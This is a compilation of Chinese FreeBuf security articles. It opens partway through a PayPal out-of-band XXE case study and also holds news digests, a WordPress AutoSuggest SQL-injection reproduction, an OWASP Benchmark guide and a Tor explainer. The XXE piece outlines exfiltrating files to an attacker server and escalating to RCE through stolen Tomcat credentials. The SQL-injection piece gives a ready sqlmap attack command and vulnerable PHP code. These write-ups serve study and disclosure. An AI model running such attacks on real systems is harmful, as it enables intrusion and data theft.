模拟自定义服务器并监听端口，包括（HTTPS，HTTP）。因此，为了克服此限制而不是来设置HTTP服务器的配置，我使用了一种技术来欺骗目标服务器以开启与端口443（https）上的自定义FTP服务器的连接，来自多行URI的每一行将作为单独的命令被请求。XML解释器解析外部DTD文件后，要读取的文件内容将发送到自定义FTP服务器上，并仅在一个请求中收集到所有数据。因此，我们的最终payload：POC源代码：自定义FTP服务器 https://github.com/Gitr007/Bug-Bounty-Vulnerability-Research/blob/master/Paypal%20MultiOrder%20Shipping%20XXE/custom_ftp_server.rbHTTP服务器 https://github.com/Gitr007/Bug-Bounty-Vulnerability-Research/blob/master/Paypal%20MultiOrder%20Shipping%20XXE/http_server.py在fuzz更多功能之后，我可以利用带外XXE来发现一些文件，并且可以进行更多的攻击。这种风险使远程攻击者（没有特权或用户交互）访问PayPal服务器及其内部系统。远程执行代码场景：这种后果非常危险，攻击者能够有效地绕过严格的防火墙，授权方案，造成敏感数据泄露和PayPal内部网络访问。在我们的案例中，我在运行XXE之后成功地将任何类型的数据泄露到我的外部服务器，这使我能够看到目标系统并识别已安装的应用程序，从而获得RCE的立足点。我想方法来读取配置文件，服务器日志文件，用户历史记录和内部主机信息等。由于PayPal信息的敏感性，我不允许分享RCE利用部分。1. 通过历史记录日志访问Web管理门户：2. 检查历史日志的内容（例如：~/.bash_history），查找已部署的服务。3. 执行本地系统文件扫描。4. 确定Apache Tomcat应用程序。5. 通过XXE进行探测来发送Apache Tomcat配置文件，身份验证凭据返回给我们的服务器。6. 在配置中找到URL后，Web浏览器将访问Web管理控制台。7. 确认RCE，授予访问权限。*参考链接：r00thunt，由生如夏花编译，转载请注明来自FreeBuf.COM",带外通道（OOB）Bind XML外部实体注入漏洞：PayPal案例研究
Freddy,,2018-12-29,各位Buffer早上好，今天是 2018 年 12 月 29 日星期六。今天的早餐铺内容有：研究人员放出Microsoft Edge内存漏洞利用代码；法国VirusTotal捕获Shamoon 3新变种，使用过期的百度证书签发；澳洲西悉尼大学推出网络安全与行为学位；黑客利用攻击软件侵入平罗政府信息网站，获刑9个月；Android自带浏览器会泄露系统敏感信息，包括漏洞修没修。研究人员放出Microsoft Edge内存漏洞利用代码此前，Microsoft Edge浏览器被曝存在内存漏洞，可实现计算机上的远程代码执行。该安全漏洞影响Chakra，它一个支持Edge的JavaScript引擎，可能允许攻击者以与登录用户相同的权限在计算机上运行任意代码。网络攻击者可以将恶意负载托管在一个特制网站旨在通过Microsoft Edge利用漏洞的特制网站，然后诱使用户查看该网站来自phoenhex漏洞研究团队的Bruno Keith表示，该漏洞已被微软标记为“中等”严重性漏洞，影响大多数操作系统。上次被标记为“中等”严重性的系统漏洞是Windows Sever 2019和2016上发现的。本次发布的概念验证代码共有71行，可导致一个边界（OOB）存储器读取泄漏，这不会导致任何实质性的损害。但攻击者可以修改代码实施其他形式的攻击。[来源：bleepingcomputer]法国VirusTotal捕获Shamoon 3新变种，使用过期的百度证书签发12月23日，有人在法国VirusTotal平台上传了一个全新的Shamoon 3蠕虫变种，使用已过期的百度证书签发，该证书于2015年3月25日发布， 并于2016年3月26日到期。该变种使用商业工具Enigma第4版进行封装。来自Anomali实验室的研究人员对该变种进行了分析，发现它使用燃烧的美元图像和儿童图像。专家认为Shamoon 3变种不一定来自最初的制作者，可能是其他人基于Shamoon 2变种修改的。为了欺骗受害者，攻击者在文件描述中使用了内部文件名“Baidu PC Faster”和“Baidu WiFi Hotspot Setup”。[来源：securityaffairs]澳洲西悉尼大学推出网络安全与行为学位为解决全球网络安全与情报方面的技术短缺，西悉尼大学已推出网络安全与行为学位。据Careers360 12月26日报道，福布斯预测，网络安全行业在2021年以前将有350万空缺岗位。去年印度成为仅次于美国与中国的最易受网络威胁的国家。未来的网络安全将取决于人类是否能够尽快创新解决方案，努力确保公司、国家与个人的数据安全。西悉尼大学的网络安全与行为学位是澳大利亚与亚太地区第一个网络安全学位，该学位同时分析技术与人类行为，以帮助学生在数字世界中拥有竞争优势。该跨学科课程将心理理论与研究应用于决策，人为失误，社会影响，组织文化与弱势群体，以及计算机与网络安全的培训——这些都是保护数据免受网络攻击的必需技能。[来源：E安全]黑客利用攻击软件侵入平罗政府信息网站，获刑9个月近日，平罗法院审理了一起利用非法扫描攻击软件侵入政府信息网站的案件，董大风（化名）因犯非法侵入计算机信息系统罪，获刑9个月。今年3月至4月，董大风通过租赁境外网络虚拟主机，远程运行其在网络上下载的捕获网站域名软件和扫描软件，欲利用扫描到的网站漏洞，对网站进行攻击，在多次对平罗县政府信息网站扫描时，被防火墙拦截。网站技术人员发现该问题后及时报警，两天后平罗县公安局民警在厦门高崎国际机场将董大风抓获归案。平罗法院审理后认为，董大风违反国家法律规定，侵入国家事务的计算机系统，对政府网站的安全构成威胁，其行为已触犯刑法，构成非法侵入计算机信息系统罪。董大风到案后如实供述自己的罪行，系坦白，依法可以从轻处罚。鉴于董大风认罪悔罪，其犯罪行为未造成重大危害后果，结合其犯罪情节、性质等，依法对其判处有期徒刑9个月。[来源：银川晚报]Android自带浏览器会泄露系统敏感信息，包括漏洞修没修网络安全咨询公司Nightwatch发现，谷歌的Chrome浏览器、WebView和Android的Chrome标签显示了有关运行它的设备的硬件型号，固件版本和安全补丁级别的信息。这也会影响使用Chrome呈现网络内容的所有Android应用程序。此信息可用于跟踪用户和指纹设备。它还可用于确定特定设备易受攻击的漏洞，以便针对攻击。虽然供应商（Google）在2015年拒绝了最初的错误报告，但他们已于2018年10月针对Chrome v70发布了部分修复程序。该修复程序隐藏固件信息，同时保留硬件模型标识符。所有先前版本都会受到影响。建议用户升级到70或更高版本。由于此修复程序不适用于WebView用法，因此应用程序开发人员应手动覆盖其应用程序中的用户代理配置。[来源：黑客视界]*Freddy编译整理，转载请注明来自FreeBuf.COM,BUF早餐铺 | 研究人员放出Microsoft Edge内存漏洞利用代码；法国VirusTotal捕获Shamoon 3新变种，使用过期的百度证书签发；澳洲西悉尼大学推出网络安全与行为学位
AngelaY,,2018-12-27,各位Buffer早上好，今天是 2018 年 12 月 27 日星期四。今天的早餐铺内容有：苹果App Store打开困难，疑似服务器圣诞宕机；微软为IE发布补丁，却导致部分联想笔记本电脑无法启动；黑客发起大规模钓鱼攻击，绕过 Gmail 和 Yahoo 的 2FA 认证并入侵账户；爆发 18 个月后，WannaCry仍然潜伏在受感染的计算机上；网信办发布《金融信息服务管理规定》。        以下请看详细内容：苹果App Store打开困难 疑似服务器圣诞宕机12月26日上午，不少国内用户通过微博反馈，苹果公司的App Store应用商店出现打开缓慢，甚至无法打开的情形。早上8点左右，微博上开始陆续出现用户反馈，基本都是长时间停留在载入页面，最终显示“无法连接到App Store”的提示。但在苹果系统状态查询页面，显示App Store是正常状态。　一些外媒认为，可能是圣诞节很多人会收到了iPhone当礼物，导致激活和下载App比平时更多，压垮了服务器。但目前尚无法确定是不是这个原因。此问题似乎并没影响到全部用户，在微博上，大约半数用户反馈他们能正常打开。[来源：新浪数码]微软为IE发布补丁，却导致部分联想笔记本电脑无法启动几天前微软发布了一个针对Internet Explorer的紧急 补丁，用于修复浏览器中的零日漏洞。但似乎该补丁本身也存在问题，具体来说，有一些联想笔记本电脑的用户发现，在安装KB4467691补丁后，他们无法启动电脑。在发布补丁时，微软就表示会导致旧版Windows 10出现一些问题，例如，.NET框架问题，以及“开始”菜单中的Web链接问题。但微软后来又更新了补丁页面，以说明补丁会导致某些联想笔记本电脑出现进一步的潜在问题，微软称，“安装KB4467691后，Windows可能无法在RAM少于8    GB的某些联想笔记本电脑上启动。”微软接着为遇到问题的用户提出了几种可能的解决方法：使用统一可扩展固件接口（UEFI）重新启动受影响的计算机，禁用安全启动然后重新启动。如果您的计算机上启用了BitLocker，则可能必须在禁用安全启动后进行BitLocker恢复。微软表示，他们“正在与联想合作，并将在即将发布的版本中提供更新”。[来源：ithome]黑客发起大规模钓鱼攻击，绕过 Gmail 和 Yahoo 的 2FA 认证并入侵账户Amnesty International 公司近日发布报告，分析了 2017-2018年攻击者针对 Gmail 和 Yahoo 等邮箱账户所发起大规模钓鱼攻击。通过钓鱼邮件，攻击者可以绕过这些邮箱的 2FA 认证，影响到大量中东和北非用户。当前的 2FA 认证主要将短信作为第二项验证方式，而攻击者所发布的钓鱼邮件通过伪造成“账户遭遇入侵”的提醒，诱导用户点击链接输入 2FA 验证码以修改账户信息。通过这种方式，攻击者获取到 2FA 验证信息进而真正入侵账户。[来源：securityaffairs]爆发 18 个月后，WannaCry仍然潜伏在受感染的计算机上自 2017 年 WannaCry 大规模爆发之后，至今已经 18 个月。但研究人员近期披露称，WannaCry 仍然潜伏在大量被感染的计算机中。目前，原本用于阻止 WannaCry 的“死亡开关（kill switch）”一周内仍会收到来自 194 个不同国家的 63 万个独立 IP 的连接请求，累计次数超过 1700 万。这意味着，全球几乎所有国家都依旧遭遇WannaCry 的感染。其中，中国、印度尼西亚、越南首当其冲。[来源：bleepingcomputer]网信办发布《金融信息服务管理规定》国家互联网信息办公室2018年12月26日公布《金融信息服务管理规定》（以下简称规定）。规定主要是为了加强金融信息服务内容管理，提高金融信息服务质量，促进金融信息服务健康有序发展，保护自然人、法人和非法人组织的合法权益，维护国家安全和公共利益。在中华人民共和国境内从事金融信息服务，应当遵守该规定。规定要求金融信息服务提供者应当履行主体责任，配备与服务规模相适应的管理人员、建立信息内容审核、信息数据保存、信息安全保障、个人信息保护、知识产权保护等服务规范。同时还规定了其他相关责任和禁止事项，明确了监管部门与责任主体。“规定”的具体内容可参照网信办原发布文件。[来源：网信办],BUF早餐铺 | 微软发布IE补丁导致部分联想笔记本电脑无法启动；WannaCry仍在潜伏；网信办发布《金融信息服务管理规定》
看不尽的尘埃,,2018-12-25,"前言由于笔者有个习惯，每天都会去exploit-db网站上去逛逛。最近就看到了一个WordPress插件问题导致的SQL注入漏洞，抱着好奇的心，我就开始这个漏洞的复现与分析。WP AutoSuggest简介WP AutoSuggest 这款插件在访问者输入关键字时，插件会在提交搜索查询之前通过AJAX请求在网页中显示一些建议。访问者可以通过按Enter继续搜索，或者访问者可以使用键盘箭头直接访问建议的帖子。漏洞复现首先我们得进入exploit-db网站上下载这个存在漏洞的版本的插件源码和本地搭建WordPress网站（本地搭建WordPress这里就不说了）。下载源码，如下图所示：        下载完成之后，把wp-autosuggest目录直接拖到Wordpress目录的\wp-content\plugins\下。接着，登录后台，启用这款插件，如下图所示：启用后，退出后台，如下图所示：然后根据exploit-db网站上给出的漏洞详情，我们访问下面的URL：http://www.yourwebsite.com/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&amp;wpas_keys=1访问后，网页内容如下图所示：根据exploit-db网站上给出的漏洞详情，我们也知道了wpas_keys参数存在注入，于是我们可以使用SQLMAP注入神器，对网站进行注入。SQLMAP命令如下：sqlmap.py -u ""http://www.yourwebsite.com/wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&amp;wpas_keys=1*"" --technique BT --dbms MYSQL --risk 3 --level 5 --tamper space2comment一开始，笔者使用的时php5.2.17+Apache的环境，结果复现不了，头疼了半天，如下图：后来笔者换了一个php-5.4.45+Apache的环境，就解决了。通过SQLMAP，成功获取到服务器的一些信息，如下图所示：下图也成功跑出了当前数据库的名称。漏洞分析分析WordPress插件的话还是挺容易的。文件和代码也不是很多，用Notepad++就够用啦。进入插件根目录下面就看到了autosuggest_functions.php、autosuggest.php这两个php文件。下面是autosuggest.php文件所有代码：&lt;?phpinclude 'autosuggest_functions.php';$wpas_action = '';$wpas_keys = '';if(isset($_GET['wpas_action'])) {    $wpas_action = $_GET['wpas_action'];}if (isset($_GET['wpas_keys'])) {    $wpas_keys = $_GET['wpas_keys'];}if ($wpas_action == 'query') {    require_once ('../../../wp-config.php');    header('Content-Type: text/xml');    echo '&lt;results&gt;';    global $wpdb;    $wpas_keys = str_replace(' ','%',$wpas_keys);    $pageposts = $wpdb-&gt;get_results(""SELECT * FROM $wpdb-&gt;posts WHERE (post_title LIKE '%$wpas_keys%') AND post_status = 'publish' ORDER BY post_date DESC"");    foreach ($pageposts as $post) {        setup_postdata($post);        echo ""&lt;rs id=\"""";        the_permalink();        echo ""\"" info=\"""" . autosuggest_excerpt(apply_filters('the_title', get_the_content())) . ""\""&gt;"";        the_title();        echo ""&lt;/rs&gt;"";    }    echo '&lt;/results&gt;';    die();}define('AUTOSUGGEST_DIR', get_option('siteurl') . '/' . PLUGINDIR.'/'.dirname(plugin_basename(__FILE__)));function add_autosuggest_css() {    wp_register_style('autosuggestCSS', AUTOSUGGEST_DIR . '/css/wp_autosuggest.css', null, '1', 'screen');    wp_enqueue_style('autosuggestCSS');}function add_autosuggest_js() {    wp_register_script('autosuggestJS', AUTOSUGGEST_DIR . '/js/wp.autosuggest.js', null, '1');    wp_enqueue_script('autosuggestJS');}function add_autosuggest_footer_code() {?&gt;&lt;script type=""text/javascript""&gt;var autosuggest_options = {    script: ""&lt;?php echo AUTOSUGGEST_DIR; ?&gt;/autosuggest.php?wpas_action=query&amp;"",    varname: ""wpas_keys"",    shownoresults:true,    noresults:""&lt;?php echo __('No results found.'); ?&gt;"",    timeout:15000,    callback:autosuggestSelected,    maxresults: &lt;?php echo get_wpas_option('wpas_maxresults','10'); ?&gt;};var as = new AutoSuggest('&lt;?php echo get_wpas_option('wpas_input_id','s'); ?&gt;', autosuggest_options);function autosuggestSelected(entry) {    document.location = entry['id'];}&lt;/script&gt;&lt;?php}function add_autosuggest_settings() {?&gt;&lt;div class=""wrap""&gt;    &lt;?php        $smsg = """";        if (isset($_POST['submitoptions'])) {            if (isset($_POST['wpas_input_id'])) {                update_option('wpas_input_id',$_POST['wpas_input_id']);            }            if (isset($_POST['wpas_maxresults'])) {                update_option('wpas_maxresults',$_POST['wpas_maxresults']);            }            ?&gt;            &lt;div id=""message"" class=""updated fade""&gt;&lt;p&gt;WP AutoSuggest settings updated.&lt;/p&gt;&lt;/div&gt;    &lt;?php } ?&gt;    &lt;h2&gt;WP AutoSuggest Settings&lt;/h2&gt;    &lt;form action="""" method=""post""&gt;    &lt;table class=""form-table""&gt;        &lt;tr valign=""top""&gt;        &lt;th scope=""row""&gt;Search Input ID&lt;/th&gt;        &lt;td&gt;        &lt;input type=""text"" value=""&lt;?php echo get_wpas_option('wpas_input_id','s'); ?&gt;"" id=""wpas_input_id"" name=""wpas_input_id""/&gt;&lt;br/&gt;        Default value is 's' which is used with the default WordPress theme.         &lt;/td&gt;        &lt;/tr&gt;        &lt;tr valign=""top""&gt;        &lt;th scope=""row""&gt;Max Results&lt;/th&gt;        &lt;td&gt;        &lt;input type=""text"" value=""&lt;?php echo get_wpas_option('wpas_maxresults','10'); ?&gt;"" id=""wpas_maxresults"" name=""wpas_maxresults""/&gt;&lt;br/&gt;        Maximum number of suggested results (10 by default).        &lt;/td&gt;        &lt;/tr&gt;    &lt;/table&gt;    &lt;p class=""submit""&gt;&lt;input type=""submit"" name=""submitoptions"" value=""Update Settings"" /&gt;&lt;/p&gt;    &lt;/form&gt;    &lt;/div&gt;&lt;?php}function add_autosuggest_menu_settings() {    if (function_exists('add_options_page')) {         add_options_page(             ""WP AutoSuggest""             , ""WP AutoSuggest""             , 7             , basename(__FILE__)             , 'add_autosuggest_settings');    }}add_action('wp_print_scripts', 'add_autosuggest_js');add_action('wp_print_styles', 'add_autosuggest_css');add_action('wp_footer', 'add_autosuggest_footer_code');add_action('admin_menu', 'add_autosuggest_menu_settings');?&gt;相信大家没看几行就看出了问题的所在，变量wpas_keys是直接获取GET中的wpas_keys。一点都没过滤，并且在下面代码中，变量wpas_keys也带入数据库中查询了（wpdb是wordpress操作数据库方法），于是SQL注入就产生了。修复建议1、写过滤函数，如使用正则表达式过滤传入的参数。2、对PHP进行安全配置。等等。参考资源https://www.exploit-db.com/exploits/45977*本文作者：看不尽的尘埃，转载请注明来自FreeBuf.COM",WordPress Plugin AutoSuggest插件SQL注入复现与分析
fengchenzxc,,2018-12-23,"一、简介OWASP benchmark是OWASP组织下的一个开源项目，又叫作OWASP基准测试项目，它是免费且开放的测试套件。它可以用来评估那些自动化安全扫描工具的速度、覆盖范围和准确性，这样就可以得到这些软件的优点和缺点，还可以对它们进行相互比较。每个版本的OWASP benchmark都包含数千个完全可运行和利用的测试用例，每个测试用例都映射到该漏洞的相应CWE编号，所以该项目的漏洞数量和漏洞类型都是固定的，因此就可以查看扫描工具的测试报告进行对比得出该工具的误报和漏报率。二、benchmark的评分方法一般安全检查工具会检测出大量的漏洞，但是其中有很多都是误报的。为了得到所测试的应用程序的准确程度，benchmark设置了四种专门的测试结果：1）工具正确识别了真实漏洞（True Positive-TP）；2）工具没有识别真实漏洞（False Negative-FN）；3）工具没有误报（Ture Negative-TN）；4）工具误报（False Positive-FP）考虑到如果一个工具将每一行代码都标记为漏洞，则检测结果将会是100%的误报并且是没有价值的。如果该工具没有标记一个漏洞，则误报率为0，但是它也没有报出任何一个真实的漏洞，这也是没有价值的。如果一个工具随机报告每个测试是否包含漏洞，则将具有50%的真实漏洞，和50%的误报。如下是评估安全扫描工具示意图：此图上可以直观地显示工具检测报告的真实存在的漏洞和误报的表现，我们还可以计算出一个点的得分（0-100），将其称为Benchmark Accuracy Score（基准准确度得分），是一种Youden Index。基准准确度得分的计算方法为：(sensitivity + specificity) – 1Sensitivity = TPR=TP/（TP+FN）Specificity = 1-FPR=TN/（TN+FP）Youden Index=(sensitivity + specificity) – 1            =(TPR+1-FPR)-1            =TPR-FPR三、benchmark v1.2 漏洞整理benchmark中总共有2740个漏洞：    漏洞种类数量CWE编号Command Injection25178Weak Cryptography246327Weak Hashing236328LDAP Injection5990Path Traversal26822Secure Cookie Flag67614SQL Injection50489Trust Boundary Violation126501Weak Randomness493330XPATH Injection35643XSS (Cross-Site Scripting)45579Total Test Cases2740四、benchmark搭建（windows）1）在运行benchmark之前首先确保电脑中已经搭建好git、maven（v3.2.3 or 更高）、java（7 or 8）。2）下载并编译运行benchmark：$ git clone https://github.com/OWASP/benchmark $ cd benchmark$ mvn compile   (This compiles it)$ runBenchmark.sh/.bat – This compiles and runs it.然后用浏览器打开https://localhost:8443/benchmark/，就可访问benchmark。五、使用静态扫描工具对benchmark源代码进行扫描benchmark自带了多种源代码静态扫描工具，下面说明这些工具如何使用。使用PMD对benchmark进行扫描并得到检测报告（PMD中实际上是没有安全规则的）：cd benchmark.\scripts\runPMD.bat使用FindBugs产生测试报告：cd benchmark.\scripts\runFindBugs.bat使用带有FindSecBugs插件的FindBugs：cd benchmark.\scripts\runSecFindBugs.bat最终这些检测结果都被放置在/results目录下。检测的结果如下所示：Benchmark_1.2-findbugs-v3.0.1-1026.xml六、生成记分卡产生记分卡的应用程序BenchmarkScore是内置在Benchmark中的，它对扫描工具检测结果与预测结果进行对比，并生成一组网页，详细说明所涉及工具的准确性和速度。以下命令将为/results目录中的所有结果文件计算记分卡，并将生成的记分卡放入/scorecard目录中：createScorecard.bat*本文作者：fengchenzxc，转载请注明来自FreeBuf.COM",OWASP Benchmark的搭建和使用
云鼎实验室,,2018-12-20,前言本年度最严重的几次数据泄漏，都指向了同一个词——「暗网」。在中文的语境里，这是一个犹如「月黑风高夜」般的词汇，透着诡秘和犯罪的气息。而与「暗网」关系最密切的另一个词，则非「黑客」莫属。「黑」与「暗」的组合，意味着高超的匿名和隐身技巧，令人忍不住想揭开它精巧的面纱。暗网是什么要解释暗网，先给整个互联网做一个简单的分层定义，如图：表网（Surface Web）通常认为，普通用户或者搜索引擎能直接访问的内容属于表网。表现形式为网页或者 APP 提供的内容。深网（Deep Web）指不能被标准搜索引擎检索到的网络数据。通常是存储在各公司或组织的数据库中，需要用专有的接口查询或干脆不对外查询，例如 Google 的后端数据库。深网数据量远大于表层网络，犹如海面和大海的关系。暗网（Dark Web）需要通过特殊的加密通道访问的网页或数据。暗网通常具有匿名的特性，既保证访问者的匿名，同时也保证服务提供者的匿名。因此，其中充斥着各种犯罪信息和违法交易（枪支、毒品、色情、暴恐、黑客等）。暗网有多个不同的实现版本，下文我们说暗网特指「Tor 网络」。网络上有些说法说暗网远大于表层网络，其实很不严谨，是把深网和暗网混为一谈了，真实的暗网只有一小部分人使用，远小于大众使用的表层网络。谁创造了暗网密码朋克故事要从90年代的一个极小众群体说起——「密码朋克」。这是一个由顶尖数学家、密码学家和程序员组成的群体，他们关注「匿名、自由、隐私」，其中许多人抱着自由主义和无政府主义的理念，并在美国掀起了「加密无政府主义运动」，他们以密码学和互联网为武器，与强权展开直接对抗。正是这群人，创造了许多加密技术和协议，也奠定了互联网的许多底层技术和通信协议，从加密邮件到 HTTPS，从 RSA 到区块链，等等等等。国外政府部门花开两朵，密码朋克们希望保护自己的信息和隐私不被政府获取；而政府同样也有这个需求，甚至更强烈得多，因为他们要保证情报的传输安全，同时要保护情报人员传递信息时无法被网络追踪。因此，1995年，美国海军研究实验室也进行了匿名网络的相关项目研究，这也就是暗网的前身。2004 年，「Tor 洋葱网络」正式对外发布，意味着普通用户也可以使用匿名网络技术来保证自己的匿名性。也就代表着「暗网」这个概念正式走向公众。为什么叫洋葱网络，因为其中的通信内容被三重加密，像洋葱一样，剥开一层还有一层。Tor 网络虽然理论上比较安全，但其中的中转节点是由志愿者部署，如果掌握了其中足够的节点，也是有概率进行完整通信追踪的。而且这毕竟是孵化自美国海军的一个项目，是否有一些精心构造的安全缺陷，难以确认。暗网上的数据泄露一个能保证访问者和服务提供者都匿名的网络，天生就是法外之地。因此，各路违法信息交流充斥暗网，尤其是2011年后，由于比特币技术的兴起，暗网终于从「匿名的信息交流」进化到了「匿名的价值交换」阶段，这个颠覆性变革，随着「Silk Road」的建立（丝绸之路：可以理解为基于比特币的暗网淘宝），掀起了违法交易的高潮。当然，大概同时也掀起了 FBI 相关部门的加班高潮。很巧的是，同样是2011年底，国内发生了一轮标志性的大规模的用户数据泄漏事件，之后各种数据泄漏就成为了每年的常态。早期此类数据交易往往是黑客私下交易，而近年来逐渐被搬到暗网进行交易。为此，腾讯安全云鼎实验室对暗网的主要交易平台进行了监测，并抽取了近几个月针对国内用户的数据泄漏的情况进行了统计。可以看到，近期泄漏数据，主要以网购/物流/身份证/酒店/社交帐号数据为主。暗网上的业务暗网最大的几个市场均在近年被 FBI 捣毁，如 Silk Road、AlphaBay，因此，2017年来暗网黑市有所收敛，并不如前几年火爆。我们统计了目前存在的几大市场商品分类，可以看出，毒品/药物类还是占据了超过50%的份额，海外使用违禁药物的情形非常严峻，其次是数字商品类，并充斥着各种色情、黑客、枪支、护照、假钞等违法内容。暗网匿名原理暗网最重要的作用是保证匿名，其匿名性体现在两个方面：访问普通网站时，网站无法得知访问者 IP 地址。提供暗网服务时，用户无法得知服务器 IP 地址。两个能力加起来则保障了暗网用户访问暗网网站时，双方都无法得知对方 IP 地址，且中间节点也无法同时得知双方 IP 地址。听起来挺科幻的，毕竟我们平时使用的 VPN 等科学上网技术只使用了一层跳板，而 Tor 技术使用了三层跳板。关于 VPN 的原理，可以参考下图：VPN 原理图解下面对暗网匿名原理进行详细解析：访问普通网站先来看一个真实访问普通网站的跳转情况：从上图可以看到，我们使用浏览器访问 google.com，但中间经过了3个节点 IP 地址，分别在匈牙利、西班牙、德国，然后再访问到谷歌的服务器。Tor 用户针对普通网站访问流程，如下图所示。Tor 网络中的每个节点都是随机选取，且每个节点看到的信息不超过一跳，所以通过网络流量监控嗅探到的 Tor 流量不能同时获取通信两端的 IP 信息；且每一个节点处都是加密形式。这里随机选取的三个节点的功能顺序是：入口节点、中间节点、出口节点；数据流方向为：客户端、入口节点、中间节点、出口节点、WEB 服务器。Tor 网络有其特有的加密方式–三层密钥加密。三层密钥的建立是在网络请求的初始，当和下一个节点连接时创建一对非对称密钥，三个随机节点共创建了三对密钥并将公钥回传到客户端。数据经客户端三层密钥加密后，进行 Tor 网络的传输，每经过一个节点，便解开一层加密，顺序依次为：入口节点解开第一层加密，中间节点解开第二层加密，出口节点解开第三层加密。通过层层加密让流量监控无法嗅探明文数据。访问匿名网站先来看一次真实访问匿名网站的跳转情况：从上图可以看到，我们通过浏览器尝试访问一个奇怪的域名（uffti3lhacanefgy.onion），但和前面普通网站不一样的是，中间经过了6个节点，其中前3个可见 IP，另外3个命名为 Relay，然后再访问到那个奇怪的域名。这个访问匿名网站的流程比较复杂，在普通互联网上，当我们知道网站域名时，通过 DNS 协议解析到 IP 地址，然后访问。但 Tor 网络域名是 .onion 为后缀，并不是使用普通的 DNS 方式来解析，而是使用下面的方法。下面我们结合 torproject.org 网站介绍的洋葱服务协议、业界约定俗成的各个环节的名称、及上面的原理图进行 Tor 访问匿名网站的原理复盘。在原Tor网络上增加了承载暗网网址导航功能的目录数据库(DB)，暗网服务器选定的允许与其通信的介绍点(Introduction point)，及进行两端数据传输的最终会合点(Rendezvous point)。原理图中的每一步连接，都是建立在 Tor 网络的三跳连接之上，杜绝流量监控嗅探到明文数据。下面我们了解一下访问匿名网站的过程。Step 1: 暗网服务器连入 Tor 网络，并隐匿IP信息这一步是通过介绍点来完成，方法是暗网服务器选取若干节点充当介绍点，建立Tor线路；并以介绍点充当影子功能，隐匿IP信息。Step 2: 暗网服务器通过向目录数据库注册，公示自身的存在这一步是通过目录数据库来完成，目录数据库收录了各个暗网服务器上传的自身标识（公钥、对应介绍点摘要等），这些标识以自身的私钥签名。暗网服务器的域名(例：uffti3lhacanefgy.onion)由公钥派生。Step 3: 客户端获取暗网网址对应的标识信息，拿到网址对应的公钥与介绍点这一步是客户端通过Tor线路访问目录数据库拿到的结果，此外还进行标识的篡改验证。Step 4: 客户端随机选取节点构建会合点，为后续与暗网服务器传输数据做准备这一步是会合点的生成，除为选取的会合点创建Tor线路外，同时会合点还会收到一次性「验证信息」，用来校验暗网服务器。Step 5\6: 客户端通过介绍点，通告暗网服务器会合点的地址和「验证信息」这一步的核心是让暗网服务器知道会合点的存在，媒介是客户端在目录数据库中获取到的对应暗网网址的介绍点，同时传递了后续用来对接验证的「验证信息」。Step 7: 暗网服务器通过Tor线路连接会合点，最终与客户端达成数据传输这一步暗网服务器也通过Tor线路与会合点建立连接，但两端还未达成真正的通信，必须进行「验证信息」的核实，当真正验证成功后，才能达成真正的通路。经过以上复杂流程，客户端和暗网服务器建立通信成功，形成一个上面截图的六跳连接，并成功保证了双方的匿名性。Tor 网络节点从前面可以看到，暗网的匿名性基于其众多的节点，但如果部署足够多的节点，是否就能探测到双方的 IP 地址和通信数据呢？先来看看暗网节点的情况。节点介绍暗网节点一共分为以下3类：入口节点/中间节点入口节点和中间节点没有本质的差别，通常各IDC 运营商都允许服务器被部署为入口节点和中间节点，新节点上线只能是中间节点，当稳定性和带宽都比较高时，才允许被升级为入口节点。出口节点出口节点从技术上看和入口节点一样，但通常IDC 运营商是不允许服务器部署出口节点的，因为如果引发了犯罪行为，由于无法进行往回追踪，会导致运营商背锅。因此，出口节点通常是学术机构、ISP、科研单位、公共图书馆等才会部署。网桥由于入口节点是公开的，因此很容易被封锁。为了保证这些地区的人也能访问 Tor 网络，还存在一个秘密的入口列表，称之为网桥节点。这个秘密列表每次只可以查询到3个入口节点，通过一些机制保证不能简单被遍历，以此来对抗封锁。节点数据截止当前，目前运行的 Tor 节点数量大概有7500，普通节点大约6500，网桥节点接近1000。普通节点中，入口节点（Guard）大约2400，出口节点（Exit）大约800多。从这个数据来看，假设我们在「入中出」三类节点中各有一台机器，能检测到完整数据的概率大约是 1/(3400 * 800 * 3300) = 1/8976000000。大约是九十亿分之一。其中大多数节点主要分布在欧美国家。节点详情完整的公开节点列表可以在以下网址查询到https://torstatus.rueckgr.at/，云厂商可以根据这个列表进行自查。部分节点详细数据Tor 用户全球每天使用 Tor 网络的用户基本稳定在200万人，相对于数十亿的互联网用户，其实非常小量，而其中访问暗网匿名网站的用户更是其中的一小部分。暗网用户分布国家 TOP10。国家用户数占比美国36831818.08 %俄罗斯24679012.11 %阿联酋21838710.72 %德国1523827.48 %印度尼西亚993104.87 %法国937844.60 %乌克兰763653.75 %英国619833.04 %印度455232.23 %荷兰433862.13 %其它平行网络前面说过，Tor 网络只是暗网的一个实现版本，其他的还有 Freenet 和 I2P 网络，但用户量远远低于 Tor，因此仅作了解就好。近年来由于区块链技术的发展，又出现了一种基于区块链技术的分布式匿名网络，其典型例子是 ZeroNet（零网）。具体用法可以参见官网，https://zeronet.io，用来搭建自己的网站，不但匿名，甚至无需服务器。写在最后技术本身是中立的，尤其是在密码学的领域，一方面保障着整个互联网的安全和信任基础，一方面也包庇了暗网下的种种犯罪。Tor 网络也一样，一方面为大众提供了一种安全的匿名方案，一方面也为非法交易提供了温床。阴阳总是交融地存在，所幸黑色领域终究是少数，如何将黑色领域尽量压缩，道阻且长。揭开了暗网的面纱，本系列下一篇，将用最科普的方式，继续讲述暗网背后的密码学原理。参考资料[1] Tor: Overviewhttps://www.torproject.org/about/overview.html.en[2] Tor: Onion Service Protocolhttps://www.torproject.org/docs/onion-services[3] Tor: Relays and bridgeshttps://metrics.torproject.org/networksize.html[4] Tor: Relays by relay flaghttps://metrics.torproject.org/relayflags.html*本文作者：karmayu、murphyzhang@云鼎实验室，转载请注明来自FreeBuf.COM,密码朋克的社会实验（一）：开灯看暗网
